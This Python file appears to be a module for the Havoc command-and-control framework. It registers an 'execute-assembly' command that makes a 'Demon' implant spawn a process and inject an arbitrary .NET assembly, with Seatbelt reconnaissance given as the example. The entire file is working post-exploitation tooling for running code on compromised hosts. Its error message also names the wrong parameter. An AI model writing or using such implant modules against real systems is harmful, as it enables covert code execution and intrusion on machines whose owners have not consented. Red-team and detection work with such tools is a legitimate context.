from struct import pack, calcsize
from havoc import Demon, RegisterCommand


class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack('<L', self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)


def InvokeAssembly(demonID, *param):
    taskID   : str    = None
    demon    : Demon  = None
    packer   = Packer()

    demon = Demon(demonID)

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite(demon.CONSOLE_ERROR, 'x86 is not supported')
        return False

    taskID = demon.ConsoleWrite(demon.CONSOLE_TASK, 'Tasked demon spawn and inject an assembly executable')
    
    if len(param) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, 'Not enough arguments')
        return

    try:
        packer.addstr('DefaultAppDomain')
        packer.addstr('v4.0.30319')
        packer.addstr(open(param[0], 'rb').read())

        args = ' '
        if len(param) > 1:
            args += ' '.join(param[1:])
        
        packer.addstr(args)

    except OSError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f'Failed to open assembly file: {param[1]}')
        return

    demon.DllSpawn(taskID, f'bin/InvokeAssembly.{demon.ProcessArch}.dll', packer.getbuffer())

    return taskID


RegisterCommand(
    InvokeAssembly,
    '',
    'execute-assembly',
    'executes a dotnet assembly in a seperate process',
    0,
    '[/path/to/assembl.exe] (args)', '/tmp/Seatbelt.exe -group=user'
)
